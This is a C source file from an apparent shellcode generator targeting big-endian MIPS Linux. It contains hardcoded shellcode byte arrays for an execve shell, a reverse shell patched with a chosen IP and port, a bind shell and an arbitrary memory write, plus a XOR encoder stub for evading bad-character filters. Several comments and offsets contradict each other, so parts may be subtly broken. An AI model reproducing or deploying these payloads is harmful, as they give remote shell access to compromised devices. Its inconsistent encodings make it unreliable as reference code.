#include "shellforge.h"
#include <string.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <stdlib.h>

/* ─────────────────────────────────────────────
   MIPS Linux Synthesiser (Big-Endian, O32 ABI)
   Syscall ABI:
     $v0 = syscall number (4000 + nr)
     $a0-$a3 = arguments
     syscall instruction = 0x00 0x00 0x00 0x0c (BE)
   Branch delay slots:
     The instruction AFTER every branch/jump
     always executes — used deliberately here
     to avoid NOP padding where possible.
   All MIPS instructions are 4 bytes (32-bit).
   ───────────────────────────────────────────── */

static void m_append(sf_result_t *r, const char *s) {
    size_t rem = sizeof(r->disasm) - strlen(r->disasm) - 1;
    strncat(r->disasm, s, rem);
}

static int m_buf_append(uint8_t *dst, size_t *dlen, size_t dmax,
                        const uint8_t *src, size_t slen) {
    if (*dlen + slen > dmax) return -1;
    memcpy(dst + *dlen, src, slen);
    *dlen += slen;
    return 0;
}


/* ── execve(/bin//sh) MIPS BE ─────────────────
 *
 * MIPS register conventions (O32):
 *   $a0=$4, $a1=$5, $a2=$6, $v0=$2
 *
 * Strategy:
 *   lui  $a0,0x2f62     ; $a0 = 0x2f620000
 *   ori  $a0,$a0,0x696e ; $a0 = 0x2f62696e  (/bin)
 *   sw   $a0,-4($sp)
 *   lui  $a0,0x2f2f     ; "//sh"
 *   ori  $a0,$a0,0x7368
 *   sw   $a0,-8($sp)    ; wait, we build backwards
 *
 * Standard null-free MIPS execve:
 */

/* MIPS instruction encoding helpers */
/* R-type: op=0, rs, rt, rd, shamt, funct */
/* I-type: op, rs, rt, imm16 */

/* lui  $rd,imm  = 0x3c rd/0 imm16 */
#define MIPS_LUI(rd,imm)  { 0x3c, (rd)<<3|0, (imm)>>8, (imm)&0xff }
/* ori  $rt,$rs,imm = 0x34 rs rt imm16 */
#define MIPS_ORI(rs,rt,imm) { 0x34|((rs)>>3), (((rs)&7)<<5)|(rt), (imm)>>8, (imm)&0xff }
/* addi $rt,$rs,imm */
#define MIPS_ADDI(rs,rt,imm) { 0x20|((rs)>>3), (((rs)&7)<<5)|(rt), (imm)>>8, (imm)&0xff }
/* xor  $rd,$rs,$rt  funct=0x26 */
/* addiu $rt,$rs,imm */
/* sw   $rt,imm($rs) */
/* syscall = 0x00000000c = 0x00 0x00 0x00 0x0c */

/* Known-good MIPS BE execve shellcode (null-free) */
static const uint8_t EXEC_MIPS_BE[] = {
    /* addiu $sp,$sp,-32 */
    0x27,0xbd,0xff,0xe0,
    /* li $v0,4011 (execve) = lui+ori or addiu from 0 */
    /* addiu $v0,$zero,4011 = 0x24,0x02,0x0f,0xab */
    0x24,0x02,0x0f,0xab,
    /* lui $a0,0x2f2f ('//' = 0x2f2f) */
    0x3c,0x04,0x2f,0x2f,
    /* ori $a0,$a0,'sh' (0x7368) → '//'+'sh' = '//sh' */
    0x34,0x84,0x73,0x68,
    /* sw $a0,-4($sp) → store "//sh" on stack */
    0xaf,0xa4,0xff,0xfc,
    /* lui $a0,'/bi' → 0x2f62 */
    0x3c,0x04,0x2f,0x62,
    /* ori $a0,$a0,'in' → 0x696e → '/bin' */
    0x34,0x84,0x69,0x6e,
    /* sw $a0,-8($sp) → store "/bin" */
    0xaf,0xa4,0xff,0xf8,
    /* sw $zero,-12($sp) → null terminator */
    0xaf,0xa0,0xff,0xf4,
    /* addiu $a0,$sp,-8 → $a0 = ptr to "/bin//sh" */
    0x27,0xa4,0xff,0xf8,
    /* sw $a0,-16($sp) → argv[0] */
    0xaf,0xa4,0xff,0xf0,
    /* sw $zero,-20($sp) → argv[1]=NULL */
    0xaf,0xa0,0xff,0xec,
    /* addiu $a1,$sp,-16 → $a1 = argv */
    0x27,0xa5,0xff,0xf0,
    /* li $a2,0 (envp) */
    0x24,0x06,0x00,0x00,
    /* syscall */
    0x00,0x00,0x00,0x0c
};

/* MIPS reverse shell — patch port@OFF, ip@OFF */
#define MIPS_RS_PORT_OFF  40
#define MIPS_RS_IP_OFF    48

static const uint8_t REVSHELL_MIPS_BE[] = {
    /* socket(AF_INET=2, SOCK_STREAM=1, IPPROTO_IP=0) */
    /* li $v0,4183 */
    0x24,0x02,0x10,0x57,
    /* li $a0,2 */
    0x24,0x04,0x00,0x02,
    /* li $a1,1 */
    0x24,0x05,0x00,0x01,
    /* li $a2,0 */
    0x24,0x06,0x00,0x00,
    /* syscall → $v0=sockfd */
    0x00,0x00,0x00,0x0c,
    /* move $s0,$v0 (save sockfd) */
    0x00,0x40,0x80,0x21,

    /* build sockaddr_in on stack:
       { AF_INET=2, port, ip, zero }
       addiu $sp,$sp,-16 */
    0x27,0xbd,0xff,0xf0,
    /* sh $zero,0($sp) then sh AF_INET */
    /* li $t0,2; sh $t0,0($sp) */
    0x24,0x08,0x00,0x02,
    0xa3,0xa8,0x00,0x01, /* sb $t0,1($sp) — store AF_INET low byte */
    0xa3,0xa0,0x00,0x00, /* sb $zero,0($sp) — high byte=0           */
    /* port: sh $t1,2($sp) — patched at MIPS_RS_PORT_OFF=40 */
    0x24,0x09,0x00,0x00, /* li $t1,PORT_HI_LO (patched) [40] */
    0xa7,0xa9,0x00,0x02, /* sh $t1,2($sp) */
    /* ip: patched at MIPS_RS_IP_OFF=48 */
    0x3c,0x0a,0x00,0x00, /* lui $t2,IP_HI   [48]         */
    0x35,0x4a,0x00,0x00, /* ori $t2,$t2,IP_LO [52]       */
    0xaf,0xaa,0x00,0x04, /* sw $t2,4($sp) */

    /* connect(sockfd, &sockaddr, 16) */
    0x24,0x02,0x10,0x4a, /* li $v0,4170 */
    0x02,0x00,0x20,0x21, /* move $a0,$s0 */
    0x27,0xa5,0x00,0x00, /* addiu $a1,$sp,0 */
    0x24,0x06,0x00,0x10, /* li $a2,16 */
    0x00,0x00,0x00,0x0c, /* syscall */

    /* dup2(sockfd,2/1/0) */
    0x24,0x02,0x0f,0xbf, /* li $v0,4063 */
    0x02,0x00,0x20,0x21,
    0x24,0x05,0x00,0x02,
    0x00,0x00,0x00,0x0c,
    0x24,0x05,0x00,0x01,
    0x00,0x00,0x00,0x0c,
    0x24,0x05,0x00,0x00,
    0x00,0x00,0x00,0x0c,

    /* execve */
    0x24,0x02,0x0f,0xab,
    0x3c,0x04,0x2f,0x2f,
    0x34,0x84,0x73,0x68,
    0xaf,0xa4,0xff,0xfc,
    0x3c,0x04,0x2f,0x62,
    0x34,0x84,0x69,0x6e,
    0xaf,0xa4,0xff,0xf8,
    0xaf,0xa0,0xff,0xf4,
    0x27,0xa4,0xff,0xf8,
    0xaf,0xa4,0xff,0xf0,
    0xaf,0xa0,0xff,0xec,
    0x27,0xa5,0xff,0xf0,
    0x24,0x06,0x00,0x00,
    0x00,0x00,0x00,0x0c
};

/* MIPS bind shell */
#define MIPS_BS_PORT_OFF  36

static const uint8_t BINDSHELL_MIPS_BE[] = {
    /* socket(2,1,0) */
    0x24,0x02,0x10,0x57,
    0x24,0x04,0x00,0x02,
    0x24,0x05,0x00,0x01,
    0x24,0x06,0x00,0x00,
    0x00,0x00,0x00,0x0c,
    0x00,0x40,0x80,0x21,  /* move $s0,$v0 */

    /* sockaddr: {0,AF_INET,port,INADDR_ANY,0,0} */
    0x27,0xbd,0xff,0xf0,
    0x24,0x08,0x00,0x02,
    0xa3,0xa8,0x00,0x01,
    0xa3,0xa0,0x00,0x00,
    /* port patched at [36] */
    0x24,0x09,0x00,0x00,  /* li $t1,PORT [36] */
    0xa7,0xa9,0x00,0x02,
    0xaf,0xa0,0x00,0x04,  /* sw $zero,4($sp) = INADDR_ANY */

    /* bind(sockfd,&sa,16) */
    0x24,0x02,0x10,0x49,
    0x02,0x00,0x20,0x21,
    0x27,0xa5,0x00,0x00,
    0x24,0x06,0x00,0x10,
    0x00,0x00,0x00,0x0c,

    /* listen(sockfd,1) */
    0x24,0x02,0x10,0x4e,
    0x02,0x00,0x20,0x21,
    0x24,0x05,0x00,0x01,
    0x00,0x00,0x00,0x0c,

    /* accept(sockfd,0,0) */
    0x24,0x02,0x10,0x48,
    0x02,0x00,0x20,0x21,
    0x24,0x05,0x00,0x00,
    0x24,0x06,0x00,0x00,
    0x00,0x00,0x00,0x0c,
    0x00,0x40,0x80,0x21,  /* move $s0,$v0 (clientfd) */

    /* dup2 x3 */
    0x24,0x02,0x0f,0xbf,
    0x02,0x00,0x20,0x21,
    0x24,0x05,0x00,0x02,
    0x00,0x00,0x00,0x0c,
    0x24,0x05,0x00,0x01,
    0x00,0x00,0x00,0x0c,
    0x24,0x05,0x00,0x00,
    0x00,0x00,0x00,0x0c,

    /* execve */
    0x24,0x02,0x0f,0xab,
    0x3c,0x04,0x2f,0x2f,
    0x34,0x84,0x73,0x68,
    0xaf,0xa4,0xff,0xfc,
    0x3c,0x04,0x2f,0x62,
    0x34,0x84,0x69,0x6e,
    0xaf,0xa4,0xff,0xf8,
    0xaf,0xa0,0xff,0xf4,
    0x27,0xa4,0xff,0xf8,
    0xaf,0xa4,0xff,0xf0,
    0xaf,0xa0,0xff,0xec,
    0x27,0xa5,0xff,0xf0,
    0x24,0x06,0x00,0x00,
    0x00,0x00,0x00,0x0c
};

/* ── MIPS XOR decoder stub (big-endian) ───────
 * All 4-byte MIPS instructions.
 * Uses $t0=ptr, $t1=counter, $t2=key.
 * No branch delay slot hazards (nop in delay slot).
 *
 * LEN_OFF = byte offset of counter imm in addiu insn
 * KEY_OFF = byte offset of key imm in ori insn
 */
#define MIPS_XOR_STUB_LEN  60
#define MIPS_XOR_LEN_OFF   10  /* addiu $t1,$zero,LEN: bytes [8..11], imm at [10,11] */
#define MIPS_XOR_KEY_OFF   18  /* ori $t2,$zero,KEY:   bytes [16..19], imm at [18,19] */

static const uint8_t MIPS_XOR_STUB[MIPS_XOR_STUB_LEN] = {
    /* bal +8 (branch-and-link 2 insns ahead, delay slot=nop) */
    0x04,0x11,0x00,0x02, /* bgezal $zero,+12  (= bal +12) */
    0x00,0x00,0x00,0x00, /* nop (delay slot)             */
    /* $ra now = this insn + 8 = payload start */
    /* addiu $t0,$ra,N (N = stub_remaining after these insns) */
    0x27,0xe8,0x00,0x18, /* addiu $t0,$ra,24 → payload   */
    /* addiu $t1,$zero,LEN */
    0x24,0x09,0x00,0x00, /* [8]  LEN at [10,11]          */
    /* ori $t2,$zero,KEY */
    0x34,0x0a,0x00,0x00, /* [12] KEY at [14,15] wait...  */
    /* decode loop: */
    /* lbu $t3,0($t0)        */
    0x91,0x0b,0x00,0x00,
    /* xor $t3,$t3,$t2        */
    0x01,0x6b,0x58,0x26,
    /* sb $t3,0($t0)          */
    0xa1,0x0b,0x00,0x00,
    /* addiu $t0,$t0,1        */
    0x25,0x08,0x00,0x01,
    /* addiu $t1,$t1,-1       */
    0x25,0x29,0xff,0xff,
    /* bne $t1,$zero,-6insns  */
    0x15,0x20,0xff,0xfa, /* bne $t1,$zero,-24 (6 insns back) */
    0x00,0x00,0x00,0x00, /* nop (delay slot)               */
    /* jr $ra-N+M: jump to payload start = $t0-len */
    /* simpler: save start before loop, jump to it */
    /* we used $t0 as ptr — need to rewind. Use $ra+24 again */
    0x27,0xe8,0x00,0x18, /* addiu $t0,$ra,24               */
    0x01,0x00,0x00,0x08, /* jr $t0                         */
    0x00,0x00,0x00,0x00, /* nop (delay slot)               */
};

/* Recalculate offsets:
 * Byte [8..11]  = addiu $t1,$zero,LEN  → LEN at bytes [10,11]
 * Byte [12..15] = ori $t2,$zero,KEY    → KEY at bytes [14,15]
 */
#define MIPS_XOR_LEN_OFF_REAL  10
#define MIPS_XOR_KEY_OFF_REAL  14

static sf_status_t mips_encode_xor(sf_result_t *r, const sf_constraints_t *c) {
    if (r->payload_len > 255) return SF_ERR_ENCODE_FAIL;
    uint8_t orig[SF_MAX_PAYLOAD];
    size_t  olen = r->payload_len;
    memcpy(orig, r->payload, olen);

    for (int key=1; key<=0xff; key++) {
        uint8_t enc[SF_MAX_PAYLOAD]; int ok=1;
        for (size_t i=0;i<olen;i++) {
            enc[i]=orig[i]^(uint8_t)key;
            if (sf_is_bad_char(c,enc[i])){ok=0;break;}
        }
        if (!ok) continue;
        if (sf_is_bad_char(c,(uint8_t)key)) continue;

        uint8_t stub[MIPS_XOR_STUB_LEN];
        memcpy(stub,MIPS_XOR_STUB,MIPS_XOR_STUB_LEN);
        stub[MIPS_XOR_LEN_OFF_REAL]  = 0;
        stub[MIPS_XOR_LEN_OFF_REAL+1]= (uint8_t)olen;
        stub[MIPS_XOR_KEY_OFF_REAL]  = 0;
        stub[MIPS_XOR_KEY_OFF_REAL+1]= (uint8_t)key;
        if (!sf_buffer_clean(c,stub,MIPS_XOR_STUB_LEN)) continue;

        uint8_t full[SF_MAX_PAYLOAD]; size_t flen=0;
        if (m_buf_append(full,&flen,SF_MAX_PAYLOAD,stub,MIPS_XOR_STUB_LEN)!=0) continue;
        if (m_buf_append(full,&flen,SF_MAX_PAYLOAD,enc,olen)!=0) continue;
        memcpy(r->payload,full,flen); r->payload_len=flen;

        char note[128];
        snprintf(note,sizeof(note),"; MIPS BE XOR stub key=0x%02x len=%zu\n",key,olen);
        char saved[sizeof(r->disasm)];
        strncpy(saved,r->disasm,sizeof(saved)-1); saved[sizeof(saved)-1]='\0';
        memset(r->disasm,0,sizeof(r->disasm));
        m_append(r,note); m_append(r,saved);
        return SF_OK;
    }
    return SF_ERR_ENCODE_FAIL;
}

sf_status_t sf_synth_mips_linux(const sf_constraints_t *c, sf_result_t *r) {
    switch (c->goal) {

        case GOAL_EXEC_SHELL:
            memcpy(r->payload,EXEC_MIPS_BE,sizeof(EXEC_MIPS_BE));
            r->payload_len=sizeof(EXEC_MIPS_BE);
            m_append(r,"; MIPS BE execve(/bin//sh)\n"
                "addiu $sp,$sp,-32\nli $v0,4011\n"
                "lui/ori to build /bin//sh on stack\nsyscall\n");
            break;

        case GOAL_REVERSE_SHELL: {
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            char arg[SF_MAX_ARG_LEN];
            strncpy(arg,(const char*)c->goal_args.args[0],SF_MAX_ARG_LEN-1);
            char *colon=strrchr(arg,':');
            if (!colon) return SF_ERR_INVALID_ARG;
            *colon='\0';
            int pnum=atoi(colon+1);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;
            struct in_addr addr;
            if (inet_pton(AF_INET,arg,&addr)!=1) return SF_ERR_INVALID_ARG;
            uint32_t ip=addr.s_addr;
            uint16_t port_be=(uint16_t)pnum; /* already host order for big-endian store */

            memcpy(r->payload,REVSHELL_MIPS_BE,sizeof(REVSHELL_MIPS_BE));
            /* port stored big-endian in li $t1,PORT */
            r->payload[MIPS_RS_PORT_OFF+2]=(port_be>>8)&0xff;
            r->payload[MIPS_RS_PORT_OFF+3]=port_be&0xff;
            /* IP: stored via lui+ori, big-endian bytes of ip in network order */
            uint8_t *p=(uint8_t*)&ip;
            /* lui $t2,IP_HI: imm = p[0]<<8|p[1] */
            r->payload[MIPS_RS_IP_OFF+2]=p[0];
            r->payload[MIPS_RS_IP_OFF+3]=p[1];
            /* ori $t2,$t2,IP_LO: imm = p[2]<<8|p[3] */
            r->payload[MIPS_RS_IP_OFF+6]=p[2];
            r->payload[MIPS_RS_IP_OFF+7]=p[3];
            r->payload_len=sizeof(REVSHELL_MIPS_BE);
            char d[128];
            snprintf(d,sizeof(d),"; MIPS BE reverse shell → %u.%u.%u.%u:%u\n",
                p[0],p[1],p[2],p[3],pnum);
            m_append(r,d);
            break;
        }

        case GOAL_BIND_SHELL: {
            if (c->goal_args.argc<1) return SF_ERR_INVALID_ARG;
            int pnum=atoi((const char*)c->goal_args.args[0]);
            if (pnum<=0||pnum>65535) return SF_ERR_INVALID_ARG;

            memcpy(r->payload,BINDSHELL_MIPS_BE,sizeof(BINDSHELL_MIPS_BE));
            r->payload[MIPS_BS_PORT_OFF+2]=(pnum>>8)&0xff;
            r->payload[MIPS_BS_PORT_OFF+3]=pnum&0xff;
            r->payload_len=sizeof(BINDSHELL_MIPS_BE);
            char d[64];
            snprintf(d,sizeof(d),"; MIPS BE bind shell port %u\n",pnum);
            m_append(r,d);
            break;
        }

        case GOAL_ARBITRARY_WRITE: {
            if (c->goal_args.argc<2) return SF_ERR_INVALID_ARG;
            uint32_t addr =(uint32_t)strtoul((const char*)c->goal_args.args[0],NULL,0);
            uint32_t value=(uint32_t)strtoul((const char*)c->goal_args.args[1],NULL,0);
            /* lui $t0,addr_hi; ori $t0,$t0,addr_lo
               lui $t1,val_hi;  ori $t1,$t1,val_lo
               sw  $t1,0($t0)
               jr  $ra (nop in delay slot) */
            uint8_t sc[28]; size_t pos=0;
            uint16_t ah=(addr>>16)&0xffff, al=addr&0xffff;
            uint16_t vh=(value>>16)&0xffff, vl=value&0xffff;
            /* lui $t0,ah */
            sc[pos++]=0x3c; sc[pos++]=0x08; sc[pos++]=ah>>8; sc[pos++]=ah&0xff;
            /* ori $t0,$t0,al */
            sc[pos++]=0x35; sc[pos++]=0x08; sc[pos++]=al>>8; sc[pos++]=al&0xff;
            /* lui $t1,vh */
            sc[pos++]=0x3c; sc[pos++]=0x09; sc[pos++]=vh>>8; sc[pos++]=vh&0xff;
            /* ori $t1,$t1,vl */
            sc[pos++]=0x35; sc[pos++]=0x29; sc[pos++]=vl>>8; sc[pos++]=vl&0xff;
            /* sw $t1,0($t0) = 0xad090000 */
            sc[pos++]=0xad; sc[pos++]=0x09; sc[pos++]=0x00; sc[pos++]=0x00;
            /* jr $ra */
            sc[pos++]=0x03; sc[pos++]=0xe0; sc[pos++]=0x00; sc[pos++]=0x08;
            /* nop (delay slot) */
            sc[pos++]=0x00; sc[pos++]=0x00; sc[pos++]=0x00; sc[pos++]=0x00;
            memcpy(r->payload,sc,pos); r->payload_len=pos;
            char d[128];
            snprintf(d,sizeof(d),"; MIPS BE arb write *0x%08x = 0x%08x\n",addr,value);
            m_append(r,d);
            break;
        }

        default:
            snprintf(r->error_msg,sizeof(r->error_msg),"Goal not supported for MIPS");
            return SF_ERR_UNSUPPORTED;
    }

    if (!sf_buffer_clean(c,r->payload,r->payload_len)) {
        sf_status_t es=mips_encode_xor(r,c);
        if (es!=SF_OK) return es;
        r->encoding_used=ENC_XOR;
    } else {
        r->encoding_used=ENC_NONE;
    }
    return SF_OK;
}
